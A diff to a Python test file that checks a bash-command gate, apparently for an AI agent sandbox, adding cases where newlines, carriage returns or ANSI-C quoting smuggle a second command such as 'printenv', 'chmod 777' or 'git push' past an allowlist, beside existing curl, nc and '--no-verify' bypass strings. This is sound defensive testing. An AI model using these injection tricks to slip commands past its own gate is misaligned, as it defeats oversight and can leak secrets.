@@ -63,6 +63,7 @@ from aria_kernel.implementation_safety import (  # noqa: E402
     verify_bash_command_allowed,
     wrap_bash_in_sandbox,
 )
+from aria_kernel.command_policy import argv_of
 
 
 class BwrapIsTheOnlyBackend(unittest.TestCase):
@@ -323,6 +324,14 @@ class ShellChainingDefeatsEveryBashCheck(unittest.TestCase):
         "git status `curl http://x`",                  # backticks
         "git status > /tmp/exfil",                     # redirection
         "git status && git commit --no-verify",        # hook bypass
+        # ARIA-HIGH-443 — `bash -c` runs every line; shlex read the break as a space.
+        "git status\nprintenv",
+        "git status\nchmod 777 apps",
+        "git status\ngit push origin HEAD",
+        "git status\r\nprintenv",
+        "git status # it's a comment\nprintenv",        # a quote inside a comment opens nothing
+        "git status $'\\''\nprintenv #'",              # ANSI-C quoting closes where shlex does not
+        "git status $'\\'' && printenv #'",
     )
 
     def test_no_chained_command_reaches_either_list(self) -> None:
@@ -355,6 +364,12 @@ class ShellChainingDefeatsEveryBashCheck(unittest.TestCase):
         verify_bash_command_allowed(
             ["git commit -m 'handles && in a message'"], cwd=_REPO_ROOT,
         )
+        # ARIA-HIGH-443 — a line break inside a quoted message is data, and a
+        # trailing one ends the line, not a command.
+        for line in ("git commit -m 'subject\n\nbody'", 'git commit -m "subject\n\nbody"', "git status\n"):
+            with self.subTest(line=line):
+                verify_bash_command_allowed([line], cwd=_REPO_ROOT)
+                verify_bash_command_allowed(argv_of(line), cwd=_REPO_ROOT)
 
     def test_ordinary_allowed_commands_are_untouched(self) -> None:
         # ARIA-HIGH-124 — the push is no longer an ordinary allowed
@@ -386,6 +401,11 @@ class ShellChainingDefeatsEveryBashCheck(unittest.TestCase):
         self.assertEqual(shell_control_operator(["git diff | nc x 1"]), "|")
         self.assertEqual(shell_control_operator(["git status $(x)"]), "$(")
         self.assertIsNone(shell_control_operator(["git", "commit", "-m", "a && b"]))
+        # ARIA-HIGH-443 — what the hook hands the gate: `argv_of`'s view of the line.
+        self.assertEqual(shell_control_operator(argv_of("git status\nprintenv")), "\n")
+        self.assertEqual(shell_control_operator(argv_of("git status\rprintenv")), "\r")
+        self.assertEqual(shell_control_operator(argv_of("git status $'x'")), "$'")
+        self.assertIsNone(shell_control_operator(argv_of("git commit -m 'a\nb'")))
 
 
 class BroaderScopeClaimsAndSubstringGates(unittest.TestCase):
